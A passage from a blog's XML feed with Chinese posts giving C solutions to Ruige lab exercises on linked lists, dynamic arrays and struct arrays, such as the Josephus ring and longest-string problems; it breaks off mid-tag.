        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="八-链表1-动态结点"><a href="#八-链表1-动态结点" class="headerlink" title="八.链表1-动态结点"></a>八.链表1-动态结点</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>结点的申请和使用,假设结点的信息如下所示，利用该结构申请三个结点a，b，c。将他们依次链接在头结点H的后面，之后申请结点D，将D插入到b和c之间，最后按顺序输出该链表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int t,i;</span><br><span class="line">    struct node *head,*p,*q,*addloca,*addst,*adden;</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;3;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=(struct node *)(malloc(sizeof(struct node)));</span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;(p-&gt;data));</span><br><span class="line">        <span class="keyword">if</span>(i==0)</span><br><span class="line">            head=q=p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q-&gt;next=p;</span><br><span class="line">        p-&gt;next=NULL;</span><br><span class="line">        q=p;</span><br><span class="line">    &#125;</span><br><span class="line">    p=(struct node *)(malloc(sizeof(struct node)));</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;data);</span><br><span class="line">    addloca=p;</span><br><span class="line"></span><br><span class="line">    addst=head-&gt;next;</span><br><span class="line">    adden=addst-&gt;next;</span><br><span class="line">    addst-&gt;next=addloca;</span><br><span class="line">    addloca-&gt;next=adden;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Head:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==0)</span><br><span class="line">            p=q=head;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p=q-&gt;next;</span><br><span class="line">        q=p;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-&gt;%d&quot;</span>,p-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>多结点链表的创建（1）：根据读入的结点信息，利用尾插法创建链表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    struct node *head,*p,*q;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct node *)(malloc(sizeof(struct node)));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;data);</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                head=q=p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">            q=p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">                p=head;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p=q-&gt;next;</span><br><span class="line">            q=p;</span><br><span class="line">            <span class="keyword">if</span>(i==n-1) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p-&gt;data);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>多结点链表的创建（2）：结点的信息同第一题。根据读入的结点信息，利用头插法创建链表。创建方法是新结点总是在头结点H的后面插入,也就是在第一个正式的结点之前插入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    struct node *head,*p,*q;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        head=(struct node *)(malloc(sizeof(struct node)));</span><br><span class="line">        head-&gt;next=NULL;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct node *)(malloc(sizeof(struct node)));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;data);</span><br><span class="line">            p-&gt;next=head-&gt;next;</span><br><span class="line">            head-&gt;next=p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==0) q=p=head-&gt;next;</span><br><span class="line">            <span class="keyword">else</span> p=q-&gt;next;</span><br><span class="line">            q=p;</span><br><span class="line">            <span class="keyword">if</span>(i==n-1) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p-&gt;data);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>求链表的长度：根据读入的结点信息，利用尾插法创建链表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">struct node&#123;</span><br><span class="line">    int data;</span><br><span class="line">    struct node *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int t,flag=0,i;</span><br><span class="line">    struct node *head,*p,*q;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;t)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(t==0) <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">        p=(struct node *)malloc(sizeof(struct node));</span><br><span class="line">        p-&gt;data=t;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(flag==0)</span><br><span class="line">            head=q=p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q-&gt;next=p;</span><br><span class="line">        p-&gt;next=NULL;</span><br><span class="line">        q=p;</span><br><span class="line">        flag++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;flag;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==0)</span><br><span class="line">        &#123;</span><br><span class="line">            p=q=head;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p=q-&gt;next;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %d&quot;</span>,p-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line">        q=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>,flag);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>链表中的数据查找：利用前面的第2题创建链表，现要求写一个函数完成，按数值查找数据(找到第一个满足条件的即可)，在主函数中输出，如果找到了，这输出该数据在链表中的位置(利用w存放位置)，如果没找到则输出0。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct table&#123;</span><br><span class="line">    int num;</span><br><span class="line">    struct table *next;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,location,findnum,flag;</span><br><span class="line">    struct table *head,*p,*q;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=0;</span><br><span class="line">        location=0;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p=(struct table*)malloc(sizeof(struct table));</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>,&amp;p-&gt;num);</span><br><span class="line">            <span class="keyword">if</span>(i==0)&#123;</span><br><span class="line">                head=q=p;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                q-&gt;next=p;</span><br><span class="line">            &#125;</span><br><span class="line">            p-&gt;next=NULL;</span><br><span class="line">            q=p;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf(<span class="string">&quot;%d&quot;</span>,&amp;findnum);</span><br><span class="line">        p=head;</span><br><span class="line">        <span class="keyword">while</span>(p!=NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            location++;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;num==findnum)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=1;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==1) <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,location,findnum);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;0\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 7</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-7/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-7/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="六-动态数组"><a href="#六-动态数组" class="headerlink" title="六.动态数组"></a>六.动态数组</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>约瑟夫环：<br>有n个人,围成一个环，编号为 0、1、2、3、、、n-1，从第一个人开始循环报数，假设数到m的那个人出列，然后从下一个人继续数数，再数到m出列，以此循环，最后那个人为胜利者，求胜利者的编号。<br>输入数据有多组，每组为n与m；每组数据单独1行输出,直接输出数组编号，不用+1处理；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,m;</span><br><span class="line">    int *p;</span><br><span class="line">    int i;</span><br><span class="line">    int count;</span><br><span class="line">    int num;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        num=0;</span><br><span class="line">        count=0;</span><br><span class="line">        p=(int *)calloc(n,sizeof(int));</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">            *(p+i)=-1;</span><br><span class="line">        <span class="keyword">while</span>(num!=n-1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(*(p+i)!=0) count++;</span><br><span class="line">                <span class="keyword">if</span>(count==m)</span><br><span class="line">                &#123;</span><br><span class="line">                    *(p+i)=0;</span><br><span class="line">                    num++;</span><br><span class="line">                    count=0;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num==n-1) <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(*(p+i)==-1) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>求n个串中最长串：给定n个字符串，每个串长度小于100，求其中最长的字符串。输入数据有多组，每组构成形式如输入示例，输出该组字符串中最长的字符串，单独1行输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,len,li,maxlen;</span><br><span class="line">    char (*p)[100];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();getchar();</span><br><span class="line">        p=(char (*)[100])calloc(n,sizeof(char[100]));</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            gets((p+i));</span><br><span class="line">            len=strlen((p+i));</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                maxlen=len;</span><br><span class="line">                li=0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len&gt;maxlen)</span><br><span class="line">            &#123;</span><br><span class="line">                maxlen=len;</span><br><span class="line">                li=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,(p+li));</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>求平面中n个点之间最短线段长度：给定平面中n个点的坐标(x,y),求这个n个点之间最短连线距离。输入数据有多组，每组构成形式如输入示例，输出该组数据中最短边的距离长度，保留1位小数，单独1行输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;math.h&gt;</span></span><br><span class="line">struct axis&#123;</span><br><span class="line">    double x;</span><br><span class="line">    double y;</span><br><span class="line">&#125;;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,j;</span><br><span class="line">    struct axis *p;</span><br><span class="line">    double min,tmp;</span><br><span class="line">    double x1,y1,x2,y2;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        min=999.0;</span><br><span class="line">        p=(struct axis *)calloc(n,sizeof(struct axis));</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++) scanf(<span class="string">&quot;%lf %lf&quot;</span>,&amp;(p+i)-&gt;x,&amp;(p+i)-&gt;y);</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n-1;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+1;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                x1=(p+i)-&gt;x;</span><br><span class="line">                y1=(p+i)-&gt;y;</span><br><span class="line">                x2=(p+j)-&gt;x;</span><br><span class="line">                y2=(p+j)-&gt;y;</span><br><span class="line">                tmp=(x1-x2)*(x1-x2)+(y1-y2)*(y1-y2);</span><br><span class="line">                <span class="keyword">if</span>(tmp&lt;min) min=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.1lf\n&quot;</span>,sqrt(min));</span><br><span class="line">        free(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>段落单词分解：给出一个段落，字符数小于1000，求单词及个数。数据输入为1组，输出单词个与单词，每个单词单独1行输出，格式见示例。</p><p><code>bash #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() &#123;     int i,j,num,flag,wordl,wordnum;     char a[1005];     char word[1005][80];     gets(a);     int l=strlen(a);     a[l]=&#39; &#39;;     a[l+1]=&#39;\0&#39;;     wordnum=0;     wordl=0;     flag=0;     num=0;     for(i=0;a[i]!=&#39;\0&#39;;i++)     &#123;         if(a[i]!=&#39; &#39;) flag=1;         else         &#123;              if(flag==1)              &#123;                  wordnum++;                  num++;                  wordl=0;              &#125;              flag=0;         &#125;         if(flag==1)         &#123;             word[wordnum][wordl++]=a[i];         &#125;     &#125;     printf(&quot;%d\n&quot;,num);     for(i=0;i&lt;num;i++)     &#123;         printf(&quot;%s\n&quot;,word[i]);     &#125; &#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C  语言实验 6</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-6/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-6/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="六-结构体数组"><a href="#六-结构体数组" class="headerlink" title="六.结构体数组"></a>六.结构体数组</h5><ol><li>结构体—求n个学生的平均成绩：对给定的n个同学的成绩，求其平均成绩，并输出高于平均分之上的所有同学。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu[105];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    double sum,aver;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=0;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %lf&quot;</span>,stu[i].num,&amp;stu[i].score);</span><br><span class="line">            sum+=stu[i].score;</span><br><span class="line">        &#125;</span><br><span class="line">        aver=sum/n;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].score&gt;aver)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%8s %.1lf\n&quot;</span>,stu[i].num,stu[i].score);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" 